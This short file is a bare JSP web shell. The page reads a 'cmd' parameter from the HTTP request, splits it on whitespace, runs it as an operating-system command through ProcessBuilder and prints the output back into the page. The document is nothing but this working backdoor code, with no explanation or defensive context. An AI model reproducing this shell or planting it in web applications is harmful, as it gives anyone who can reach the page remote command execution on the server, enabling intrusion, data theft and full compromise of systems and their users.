<pre>
<%@ page import="java.util.*,java.io.*,java.lang.*"%>
<%
String cmd = request.getParameter("cmd");
Process a =( new java.lang.ProcessBuilder(cmd.toString().split("\\s"))).start();
InputStream in = a.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
%>
</pre>
